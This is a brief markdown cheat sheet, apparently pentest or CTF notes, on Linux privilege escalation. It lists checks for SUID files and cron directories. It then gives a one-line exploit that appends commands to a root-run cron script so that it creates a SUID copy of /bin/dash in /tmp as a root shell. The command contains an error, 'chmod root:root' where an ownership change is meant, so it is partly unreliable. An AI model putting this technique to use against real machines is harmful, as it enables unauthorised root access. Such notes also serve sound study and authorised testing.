Linux Privilege escalation
==========================

**Identifcation methods**
1. Check su privileged files

2. Check cronjobs
cd /etc/cron* - Check all the folders

**Using vulnerable cronjob running in root**
echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh


